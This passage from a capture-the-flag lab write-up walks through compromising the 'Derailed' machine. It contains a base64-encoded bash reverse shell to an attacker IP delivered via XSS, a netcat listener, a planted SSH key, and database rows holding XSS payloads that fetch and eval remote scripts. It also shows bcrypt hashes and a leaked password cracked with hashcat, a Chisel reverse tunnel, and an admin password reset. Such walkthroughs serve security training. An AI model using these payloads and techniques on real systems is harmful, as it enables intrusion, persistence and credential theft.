1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 93.828/93.828/93.828/0.000 ms

```

#### Shell

To limit special characters in the payload, I’ll create a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw) and base64 encode it:

```

oxdf@hacky$ echo "bash -c 'bash -i  >& /dev/tcp/10.10.14.6/443 0>&1'" | base64
YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK

```

With a little trial and error I found an extra space between `-i` and `>&` resulted in no special characters. I’ll update the XSS payload one more time, this time with `report_log=|echo 'YmFzaCAtYyAnYmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNi80NDMgMD4mMScK' | base64 -d | bash`. I’ll trigger the XSS again, and when it runs, a shell arrives at port 443:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.190 41982
bash: cannot set terminal process group (806): Inappropriate ioctl for device
bash: no job control in this shell
rails@derailed:/var/www/rails-app$

```

I’ll upgrade using the [stty / script](https://www.youtube.com/watch?v=DqE6DxqJg8Q) trick:

```

rails@derailed:/var/www/rails-app$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
rails@derailed:/var/www/rails-app$ ^Z
[1]+  Stopped                 nc -lnvp 443
oxdf@hacky$ stty raw -echo; fg
nc -lnvp 443
            reset
reset: unknown terminal type unknown
Terminal type? screen
rails@derailed:/var/www/rails-app$

```

I can also grab `user.txt` now:

```

rails@derailed:~$ cat user.txt
c4aaa505************************

```

### SSH

I’ll notice that rails is in the ssh group:

```

rails@derailed:~/.ssh$ id
uid=1000(rails) gid=1000(rails) groups=1000(rails),100(users),113(ssh)

```

This allows for rails to connect over SSH, as defined in the `/etc/ssh/sshd_config` file here:

![image-20230720131736807](/img/image-20230720131736807.png)

I’ll note it also has `AllowTcpForwarding no`, which means I can’t tunnel over SSH, which is a pain. Originally I went much further before deciding to come back and get a SSH shell as rails, but it makes sense to do it here, even without tunneling. I’ll write my public key into the `authorized_keys` file, and set the permissions correctly:

```

rails@derailed:~/.ssh$ echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing" > authorized_keys
rails@derailed:~/.ssh$ chmod 600 authorized_keys 

```

Now I can connect:

```

oxdf@hacky$ ssh -i ~/keys/ed25519_gen rails@10.10.11.190
Linux derailed 5.19.0-0.deb11.2-amd64 #1 SMP PREEMPT_DYNAMIC Debian 5.19.11-1~bpo11+1 (2022-10-03) x86_64
...[snip]...
rails@derailed:~$

```

## Shell as openmediavault-webgui

### Enumeration

#### Other Users

There are two other users with directories in `/home`:

```

rails@derailed:/home$ ls
marcus  openmediavault-webgui  rails
rails@derailed:/home$ ls marcus/
ls: cannot open directory 'marcus/': Permission denied
rails@derailed:/home$ ls -la openmediavault-webgui/
total 8
drwxr-xr-x 2 openmediavault-webgui openmediavault-webgui 4096 Nov  4  2022 .
drwxr-xr-x 5 root                  root                  4096 Nov 20  2022 ..
lrwxrwxrwx 1 openmediavault-webgui openmediavault-webgui    9 Nov  4  2022 .bash_history -> /dev/null

```

I can’t access marcus. Looking at marcus’ processes, it seems this user is responsible for running the browser that reviews reports and gets exploited with XSS:

```

rails@derailed:~$ ps auxww  | grep marcus
marcus    165141  1.5  1.1  29892 22476 ?        S    07:08   0:00 /usr/bin/python3 /home/marcus/xss.py
marcus    165144  1.8  0.9 16859276 19876 ?      Sl   07:08   0:00 /opt/WebDriver/bin/chromedriver96 --port=60665
marcus    165150  4.6  4.7 17205136 95796 ?      Sl   07:08   0:00 /usr/bin/google-chrome --allow-pre-commit-input --disable-background-networking --disable-client-side-phishing-detection --disable-default-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --incognito --log-level=0 --no-first-run --no-sandbox --no-service-autorun --password-store=basic --remote-debugging-port=0 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.Qmq1rA data:,
marcus    165153  0.0  0.0   5504   496 ?        S    07:08   0:00 cat
marcus    165154  0.0  0.0   5504   564 ?        S    07:08   0:00 cat
marcus    165156  0.2  2.7 17024364 56228 ?      S    07:08   0:00 /opt/google/chrome/chrome --type=zygote --no-zygote-sandbox --no-sandbox --enable-logging --headless --log-level=0 --headless --enable-crash-reporter
marcus    165157  0.2  2.8 17024364 58300 ?      S    07:08   0:00 /opt/google/chrome/chrome --type=zygote --no-sandbox --enable-logging --headless --log-level=0 --headless --enable-crash-reporter
marcus    165174  1.2  5.5 17123116 113100 ?     Sl   07:08   0:00 /opt/google/chrome/chrome --type=gpu-process --field-trial-handle=10506547590319037122,4223560492923560782,131072 --disable-features=PaintHolding --no-sandbox --enable-logging --headless --log-level=0 --ozone-platform=headless --use-angle=swiftshader-webgl --headless --enable-crash-reporter --gpu-preferences=UAAAAAAAAAAgAAAYAAAAAAAAAAAAAAAAAABgAAAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABgAAAAAAAAAGAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAACAAAAAAAAAA= --use-gl=angle --use-angle=swiftshader-webgl --override-use-software-gl-for-headless --enable-logging --log-level=0 --shared-files
marcus    165175  1.1  3.9 17082124 80032 ?      Sl   07:08   0:00 /opt/google/chrome/chrome --type=utility --utility-sub-type=network.mojom.NetworkService --field-trial-handle=10506547590319037122,4223560492923560782,131072 --disable-features=PaintHolding --lang=en-US --service-sandbox-type=none --no-sandbox --enable-logging --log-level=0 --use-angle=swiftshader-webgl --use-gl=angle --headless --enable-crash-reporter --enable-logging --log-level=0 --shared-files=v8_context_snapshot_data:100
marcus    165207  9.3  6.8 25504420 138792 ?     Sl   07:08   0:00 /opt/google/chrome/chrome --type=renderer --headless --enable-crash-reporter --lang=en-US --no-sandbox --enable-automation --enable-logging --log-level=0 --remote-debugging-port=0 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --field-trial-handle=10506547590319037122,4223560492923560782,131072 --disable-features=PaintHolding --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --shared-files=v8_context_snapshot_data:100

```

openmediavault-webgui is basically empty, but it’s still useful to know. It’s likely a reference to [openmediavault](https://www.openmediavault.org/), a network attached storage (NAS) solution, which could unlock additional access.

I’ll note that the name assigned to the openmediavault-webgui user is Toby Wright:

```

rails@derailed:~$ cat /etc/passwd | grep openmediavault-webgui
openmediavault-webgui:x:999:996:Toby Wright,,,:/home/openmediavault-webgui:/bin/bash

```

#### Rails Web Directory

nginx is hosting two sites:

```

rails@derailed:/etc/nginx/sites-enabled$ ls
openmediavault-webgui  rails-app.conf

```

`rails-app.conf` shows a listener on 3000 that proxies into rails on 3003:

```

server {
        listen 3000;
        server_name derailed.htb; 

        location / {
                proxy_pass http://derailed.htb:3003;
                gzip off;
                expires -1;
        }
}

```

`openmediavault-webgui` is listening on localhost only, port 80:

```

# This file is auto-generated by openmediavault (https://www.openmediavault.org)
# WARNING: Do not edit this file, your changes will get lost.

server {
    server_name openmediavault-webgui;
    root /var/www/openmediavault;
    index index.html;
    autoindex off;
    server_tokens off;
    sendfile on;
    large_client_header_buffers 4 32k;
    client_max_body_size 25M;
    error_log /var/log/nginx/openmediavault-webgui_error.log error;
    access_log /var/log/nginx/openmediavault-webgui_access.log combined;
    error_page 404 = $scheme://$host:$server_port/#/404;
    location / {
        try_files $uri $uri/ =404;
    }
    location ~* \.json$ {
        expires -1;
    }
    location ~* \.php$ {
        fastcgi_split_path_info ^(.+\.php)(/.+)$;
        fastcgi_pass unix:/run/php/php7.4-fpm-openmediavault-webgui.sock;
        fastcgi_index index.php;
        fastcgi_read_timeout 60s;
        include fastcgi.conf;
        fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    }
    #listen *:80 default_server;
    listen 127.0.0.1:80 default_server;
    include /etc/nginx/openmediavault-webgui.d/*.conf;
}

```

There are three folders in `/var/www`:

```

rails@derailed:/var/www$ ls 
html  openmediavault  rails-app

```

`html` is just the default Debian nginx page. `rails-app` is clipnotes application. `openmediavault` looks like an instance of that (which I’ll come back to later).

In `rails-app/db` there’s a SQLite DB:

```

rails@derailed:/var/www/rails-app/db$ ls
development.sqlite3  migrate  schema.rb

```

There’s a few tables:

```

rails@derailed:/var/www/rails-app/db$ sqlite3 development.sqlite3 
SQLite version 3.34.1 2021-01-20 14:10:07
Enter ".help" for usage hints.
sqlite> .tables
ar_internal_metadata  reports               users               
notes                 schema_migrations

```

Besides junk I submitted, there are two other users, tody and alice:

```

sqlite> .headers on
sqlite> select * from users;
id|username|password_digest|role|created_at|updated_at
1|alice|$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.|administrator|2022-05-30 18:02:45.319074|2022-05-30 18:02:45.319074
2|toby|$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle|user|2022-05-30 18:02:45.542476|2022-05-30 18:02:45.542476
105|0xdf|$2a$12$DJB3GIxYkpz1rkOxWKmwP.cnm6ic.jdWcFBFxXwirw.VS5dFPybHe|user|2023-07-19 17:13:44.797453|2023-07-19 17:13:44.797453
106|0xdf<b>test</b>|$2a$12$sG8d45xLAgVjrhY7kVeiNuWBN8S04ioNgtdgYqw2uMAyZZXW8nbT2|user|2023-07-19 19:32:11.049504|2023-07-19 19:32:11.049504
107|AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|$2a$12$fDMVCFjjoboVvHFz9U2Kbe536euIA6Gm0dqrknQMzafEWO7bfuIq.|user|2023-07-19 20:08:52.224937|2023-07-19 20:08:52.224937
108|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A|$2a$12$Q0AaVfmLF6Yp.lESM9c9re445KypgBXTQYfVUSZi8VKjjFE8OEaXW|user|2023-07-19 21:04:05.518276|2023-07-19 21:04:05.518276
109|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9|$2a$12$Cs8zMXcNmwPPdqDEsjbHO.dDWdg0fsEoyKMrlCG6g4S8byWamxfma|user|2023-07-19 21:05:36.554805|2023-07-19 21:05:36.554805
110|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<script>alert(1)</script>|$2a$12$bl5b5OhOPon6yWiCecQmn.XA5TrfzPuBy0q1s3cq9JllNoWB1LHUW|user|2023-07-19 21:10:58.115547|2023-07-19 21:10:58.115547
111|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=alert(1) />|$2a$12$6JxEirjtiNeeqfh1q/YDb./QlruSQqZwcQiS9C1xSces1VNL2jOM2|user|2023-07-19 21:13:25.997637|2023-07-19 21:13:25.997637
112|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<script src="http://10.10.14.6/x.js"></script>|$2a$12$wgTlg7DLNb.pkdxBLVHc3O0IGQXkXunE1U5SpMH.tQBxY607fdQza|user|2023-07-19 21:16:10.817502|2023-07-19 21:16:10.817502
113|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<script>document.location="http://10.10.14.6/test";</script>|$2a$12$D2JoijAMCVcIrKVL34vdJeA6P.fXeRRZSstyqRORQ17DW/aRtZNNe|user|2023-07-19 21:19:48.760857|2023-07-19 21:19:48.760857
114|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=document.location="http://10.10.14.6/xss" />|$2a$12$FHBL2qUuFUC/66Zoa6HdmOJud.snVige.ub45vd1NZ5bQrNp8qCei|user|2023-07-19 21:20:52.458749|2023-07-19 21:20:52.458749
115|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="document.location=http://10.10.14.6/xss" />|$2a$12$.ktGXw2gESMAs1ne/tUtnOU2/N2brvmakxeEMzyem2APDCdz/tcqC|user|2023-07-19 21:21:34.761976|2023-07-19 21:21:34.761976
116|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<select<style/><img src='http://10.10.14.6/xss>|$2a$12$8olOWHQVwKVNqV6eUmKXgOyiaHOQcJAH3ZLPIu6LnYSSd86nKj64i|user|2023-07-19 21:31:08.330215|2023-07-19 21:31:08.330215
117|c0derpwnerc0derpwnerc0derpwnerc0derpwnerc0derpwn<select<style/><img src='http://10.10.14.6/c0derpwner'>|$2a$12$DFrJEGH6dwlQ/neQawQGQuacgCd4gtQwOTTZ/uPpXVaOOROwZEM9K|user|2023-07-19 21:32:20.269798|2023-07-19 21:32:20.269798
118|c0derpwnerc0derpwnerc0derpwnerc0derpwnerc0derpwn<select<style/><img src='http://10.10.14.6/c0derpwner'>|$2a$12$YDADEpUR8qWm5NMMXJ2FK.MRp22Ju9YD1nSKu6taUEGV2TPFqrZvu|user|2023-07-19 21:32:44.208237|2023-07-19 21:32:44.208237
119|ahahhahhahahahhahahhahahhahahahhahahahhahahha<script src=http://10.10.14.6/lol></script>|$2a$12$4VlQAACmOgiB2KIvgogfOeojnJqgD9CAWpR04R2NunB1YB12TUEOO|user|2023-07-19 21:34:02.621965|2023-07-19 21:34:02.621965
120|hahahahhahhahahahhahahhahahhahahahhahahahhahahha<script src=http://10.10.14.6/lol></script>|$2a$12$x08EqabROixvtZ9lO0fKI.iB3bVu9mjsvl5ZofLOhrSMAPnOapPoa|user|2023-07-19 21:34:36.188247|2023-07-19 21:34:36.188247
121|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror='const varName = require(http://10.10.14.6/require);'/>|$2a$12$JleUHwZVt0pa/oVrw06jvupUoyzD.jfbPK5oJVQqSoKTFWJklIS3m|user|2023-07-19 21:43:42.416208|2023-07-19 21:43:42.416208
122|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=import('http://10.10.14.6/import/x.js;') />|$2a$12$7sDTadpV7cnnMsaF8R.6ceLZosCL4HFlSht3Ohf0bn1J2tQb62jDC|user|2023-07-19 21:45:25.750435|2023-07-19 21:45:25.750435
123|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=require('http://10.10.14.6/import/x.js;') />|$2a$12$OXUmiZeRioUjEu9wlp1GcObPK52EQFj8w3M0pW4GD6e4l.dGE5I/S|user|2023-07-19 21:46:10.078449|2023-07-19 21:46:10.078449
124|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2A|$2a$12$nL101K.SuBoM2U3ux0a9huq4rqBwfXLETxHL8ZkY6sfVqrnv0dE1G|user|2023-07-19 21:46:19.048602|2023-07-19 21:46:19.048602
125|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=const a = require('http://10.10.14.6/import/x.js'); a.run(); />|$2a$12$PTHPuQoworOSyiXXlIuZ1OQV.qwYscmNtAQ4GyH/CzOJpcnHLOS6S|user|2023-07-19 21:47:36.189326|2023-07-19 21:47:36.189326
126|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="const a = require('http://10.10.14.6/import/x.js'); a.run();" />|$2a$12$zLNLJWL.rtWd17NRl7vs.uJPHOjm37vQSf8Ioshqp5qsoKgXiAPCW|user|2023-07-19 21:48:07.684613|2023-07-19 21:48:07.684613
127|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<script>alert(1)</script>|$2a$12$f4hE7yXCcUNoJbWzmxf3devlPPN3TSmFNZRV0NaWORpCQ5Ub50JU6|user|2023-07-19 21:50:16.602200|2023-07-19 21:50:16.602200
128|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=fetch('http://10.10.14.6/fetch') />|$2a$12$3IQ73uvHr9INl2Z4X9AgeeSgx3ZJWYaG00GwSgK4QKjPKaj7OG0jW|user|2023-07-19 21:54:54.220252|2023-07-19 21:54:54.220252
129|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=fetch('http://10.10.14.6/fetch').then(function(r){ eval(r);} />|$2a$12$dBI04HB28z./PKSpx9e4qONoL8elaNFw0DIhI9pDvFHzxFRvaROXe|user|2023-07-19 21:56:49.268887|2023-07-19 21:56:49.268887
130|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror=fetch('http://10.10.14.6/fetch').then(function(r){ eval(r);}) />|$2a$12$csPSXYP9.6JBahQzROwPS.C2LuJX4wvJM.BPrXii5qEauhWMYBLLq|user|2023-07-19 21:57:33.337693|2023-07-19 21:57:33.337693
131|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="x=1; alert(x)" />|$2a$12$Ioelh/zWWuxdHYzTOqsHMuZj4t3F8gKpSHmK6iGOrMyw0lZIv/2u.|user|2023-07-19 22:03:48.158132|2023-07-19 22:03:48.158132
132|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="x=await fetch('http://10.10.14.6/await');alert(x)" />|$2a$12$zRhbvL59z3pH3AMfhMHGfeP1RcjLXP2iUGSjpDrOJrNd.4.pWJrOG|user|2023-07-19 22:04:32.743237|2023-07-19 22:04:32.743237
133|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="x=await fetch('http://10.10.14.6/await');" />|$2a$12$QxzqSC2ssf6wPFXnYaOIqemdBaf9RoBt2J2F9lGqrxsZyx93YzTrG|user|2023-07-19 22:05:11.424591|2023-07-19 22:05:11.424591
134|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/console').then(r => r.text()).then(t => {alert(t)});" />|$2a$12$gPnbAd9MQFUiWNsRe8n7aO1xcZmrT6JQ3e2TQRxR3xp0GJbLVxLji|user|2023-07-19 22:07:38.687065|2023-07-19 22:07:38.687065
135|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/console').then(r => r.text()).then(t => {eval(t)});" />|$2a$12$lifVKjRQjzZZwCyYwtm.u.4La1NSI1ngDyJZy17nD0ZgmGM.Ug5lC|user|2023-07-19 22:08:35.307521|2023-07-19 22:08:35.307521
136|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/console').then(r => r.text()).then(t => {eval(t)});" />|$2a$12$EEMTawRNufRV.QTSKpiXlua7g4G5UqY17RYLLJXqekpjAmu66pFB2|user|2023-07-19 22:10:31.450989|2023-07-19 22:10:31.450989
137|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/xss.js');" />|$2a$12$LDqjlFDkH9dtnyz.vmSOre/vC6W3kXHfISd1mi3YbQCjQBnd.t3ia|user|2023-07-19 22:20:08.616202|2023-07-19 22:20:08.616202
138|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/xss.js').then(r => r.text()).then(t => {console.log(t)});" />|$2a$12$Uysq4iRq0bvaS0LpTjQ/xO7WdTlENRoXSzBC1eXrzcrlMMuuJLNR2|user|2023-07-19 22:24:40.228790|2023-07-19 22:24:40.228790
139|Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5<img src='#' onerror="fetch('http://10.10.14.6/xss.js').then(r => r.text()).then(t => {eval(t)});" />|$2a$12$F3tZMI3INzmBIfbmlHEXQOQ7IBlE8Qb9TjkWOzVZffI81WGuQAYzC|user|2023-07-19 22:36:30.880049|2023-07-19 22:36:30.880049

```

I’ll grab those two hashes.

There’s also a Git repo in the `rails-app` directory:

```

rails@derailed:/var/www/rails-app$ git log
commit 5ef649cc9b81893b070c607bdca5e6ed4370b914 (HEAD -> master)
Author: gituser <gituser@local>
Date:   Sat May 28 15:01:14 2022 +0200

    init

commit 61995bf40dcb332b8979adc32152d73e5546e40c
Author: gituser <gituser@local>
Date:   Fri May 27 21:06:07 2022 +0200

    init

commit 15df0becc4d8fc989bda8c154637d183258d3af0
Author: gituser <gituser@local>
Date:   Thu May 19 21:41:04 2022 +0200

    init

```

In the first two commits, there’s a file `db/seeds.rb`. In `15df0bec` it’s just the default:

```

rails@derailed:/var/www/rails-app$ git checkout 15df0becc4d8fc989bda8c154637d183258d3af0 -f
...[snip]...
HEAD is now at 15df0be init
rails@derailed:/var/www/rails-app$ ls db/
development.sqlite3  migrate  schema.rb  seeds.rb
rails@derailed:/var/www/rails-app$ cat db/seeds.rb 
# This file should contain all the record creation needed to seed the database with its default values.
# The data can then be loaded with the bin/rails db:seed command (or created alongside the database with db:setup).
#
# Examples:
#
#   movies = Movie.create([{ name: 'Star Wars' }, { name: 'Lord of the Rings' }])
#   Character.create(name: 'Luke', movie: movies.first)

```

But in `61995bf4`, it has alice’s password:

```

rails@derailed:/var/www/rails-app$ git checkout 61995bf40dcb332b8979adc32152d73e5546e40c -f
Previous HEAD position was 15df0be init
HEAD is now at 61995bf init
rails@derailed:/var/www/rails-app$ cat db/seeds.rb                                         
User.create(username: "alice", password: "recliner-bellyaching-bungling-continuum-gonging-laryngitis", role: "administrator")

Note.create(content: "example content", author: "alice")

```

### Crack Passwords

I’ll first check if alice’s hash matches the password from git by putting that into a file, and passing it to `hashcat` with these two hashes:

```

$ cat site-hashes 
alice:$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.
toby:$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle
$ cat passwords 
recliner-bellyaching-bungling-continuum-gonging-laryngitis

```

`hashcat` isn’t able to automatically figure out which hash format this is, so I’ll give it `-m 3200`:

```

$ hashcat site-hashes passwords --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.:recliner-bellyaching-bungling-continuum-gonging-laryngitis
...[snip]...

```

That cracks pretty quickly, showing that this is still alice’s password, and putting that in my hashcat potfile so it doesn’t waste cycles trying to crack it again.

Now I’ll go after toby’s and it cracks as well (a bit slowly, around 8 minutes):

```

$ hashcat site-hashes /usr/share/wordlists/rockyou.txt --user -m 3200
hashcat (v6.2.6) starting
...[snip]...
$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle:greenday
...[snip]...

```

At the end, both passwords are known:

```

$ hashcat site-hashes /usr/share/wordlists/rockyou.txt --user -m 3200 --show
alice:$2a$12$hkqXQw6n0CxwBxEW/0obHOb.0/Grwie/4z95W3BhoFqpQRKIAxI7.:recliner-bellyaching-bungling-continuum-gonging-laryngitis
toby:$2a$12$AD54WZ4XBxPbNW/5gWUIKu0Hpv9UKN5RML3sDLuIqNqqimqnZYyle:greenday

```

### su

Given toby’s name is on the openmediavault-webgui account, it make sense to check that password for that user, and it works:

```

rails@derailed:~$ su - openmediavault-webgui 
Password: 
openmediavault-webgui@derailed:~$

```

openmediavault-webgui is not allow to SSH (because they are not in the ssh group, as shown [above](#ssh)):

```

oxdf@hacky$ ssh openmediavault-webgui@10.10.11.190
openmediavault-webgui@10.10.11.190's password: 
Permission denied, please try again.

```

But that’s ok as I have a very stable SSH shell from rails.

## Shell as root

### Web GUI

#### Tunnel

Given the clear signals to look at openmediavault, I’ll want to get a look at it. I already noted that this application is running on port 80 on localhost, and that I can’t SSH tunnel. I’ll upload [Chisel](https://github.com/jpillora/chisel):

```

openmediavault-webgui@derailed:/dev/shm$ wget 10.10.14.6/chisel_1.8.1_linux_amd64
--2023-07-20 13:37:31--  http://10.10.14.6/chisel_1.8.1_linux_amd64
Connecting to 10.10.14.6:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 8384512 (8.0M) [application/octet-stream]
Saving to: ‘chisel_1.8.1_linux_amd64’

chisel_1.8.1_linux_amd64                    100% [============================================>]   8.00M  7.51MB/s    in 1.1s

2023-07-20 13:37:33 (7.51 MB/s) - ‘chisel_1.8.1_linux_amd64’ saved [8384512/8384512]

```

I’ll start the server on my VM, and connect back to it:

```

openmediavault-webgui@derailed:/dev/shm$ ./chisel_1.8.1_linux_amd64 client 10.10.14.6:8000 R:8888:localhost:80

```

There’s a connection at the server:

```

oxdf@hacky$ /opt/chisel/chisel_1.8.1_linux_amd64 server -p 8000 --reverse
2023/07/20 13:38:55 server: Reverse tunnelling enabled
2023/07/20 13:38:55 server: Fingerprint n5R2RuOcas6QYwllUlfejsAp9f8gSraEP+btjjdE8dM=
2023/07/20 13:38:55 server: Listening on http://0.0.0.0:8000
2023/07/20 13:39:21 server: session#1: tun: proxy#R:8888=>localhost:80: Listening

```

Now I have a tunnel from 8888 on my host to 80 on Derailed.

#### Get Logged In

The page presents a login:

![image-20230720134302409](/img/image-20230720134302409.png)

None of the passwords I already have work. But the [FAQ](https://docs.openmediavault.org/en/5.x/faq.html#:~:text=I%C2%B4ve%20lost%20the,reset%20the%20web%20interface%20password.) has a question about resetting the password. I’ll run `/sbin/omv-firstaid` and it has an option for this:

![image-20230720135909121](/img/image-20230720135909121.png)

On following those steps, I’m able to log in.

#### Everything Broken

This GUI has a ton of potential methods to privesc:

![image-20230720140030650](/img/image-20230720140030650.png)

I can edit scheduled tasks. Under “Users”, I can edit user’s keys, shell, groups, etc. Unfortunately, for me, all of these are broken. Trying to make changes anywhere, return the same error. For example, trying to give the rails use the root and sudo groups:

![image-20230720140328808](/img/image-20230720140328808.png)

### OMV “DB”

In the openmediavault documentation, there’s a [page](https://docs.openmediavault.org/en/6.x/development/tools/omv_confdbadm.html) for a tool called `omv-confdbadm`. It starts:

> Most users tend to access/modify the database by using nano:
>
> ```

> $ nano /etc/openmediavault/config.xml
>
> ```

>
> This is a problem as sometimes a wrong pressed key can add strange chars out of the xml tags and make the database unreadable by the backend.

So the database is the XML file, `/etc/openmediavault/config.xml`!

There are XML sections for things like `usermanagement`, `network`, `iptables`, `crontab`, etc.

Some actions that openmediavault executes read/write directly to this file, while others go directly to the host system. For example, when I use `omv-firstaid` to change the password of the admin user, I don’t see any change in this file. If I look for files changed in the last minute (`find / -type f -mmin 1 2>/dev/null`), I’ll notice that `/etc/shadow` changes! It is actually changing the password of the admin account on this box. Still, other things are stored directly in this file, such as SSH keys for users, and others like cronjobs stored in this file and synced to the filesystem (as I’ll show SSH and cron in a bit).

As the help article points out, editing this large XML file in `nano` or `vim` can be error prone (especially over a reverse shell…getting SSH here is key). I had a hard time getting `omv-confdbadm` to write to the DB, but it was invaluable for validating the changes I made (again, will show below).

### OMV RPC

The openmediavault has an RPC component as well. The `omv-rpc` tool is in the [docs](https://docs.openmediavault.org/en/6.x/development/tools/omv_rpc.html) in the same section as `omv-confdbadm`. The documentation is sketchy, giving only two examples and a link to GitHub to see the different RPCs available.

I’ll try the first example (adding the pipe to `jq` to pretty print the json):

```

openmediavault-webgui@derailed:/etc/openmediavault$ /sbin/omv-rpc -u admin 'FileSystemMgmt' 'enumerateMountedFilesystems' '{"includeroot": true}' | jq .
[
  {
    "devicename": "sda1",
    "devicefile": "/dev/disk/by-uuid/b3f760a6-636d-4580-848c-96eb2fe8d64a",
    "predictabledevicefile": "/dev/disk/by-uuid/b3f760a6-636d-4580-848c-96eb2fe8d64a",
    "canonicaldevicefile": "/dev/sda1",
    "parentdevicefile": "/dev/sda",
    "devlinks": [
      "/dev/disk/by-id/scsi-36000c29400f24f5aaaa9051f3f01f588-part1",
      "/dev/disk/by-id/wwn-0x6000c29400f24f5aaaa9051f3f01f588-part1",
      "/dev/disk/by-partuuid/98a1cb55-01",
      "/dev/disk/by-path/pci-0000:0b:00.0-sas-phy0-lun-0-part1",
      "/dev/disk/by-uuid/b3f760a6-636d-4580-848c-96eb2fe8d64a"
    ],
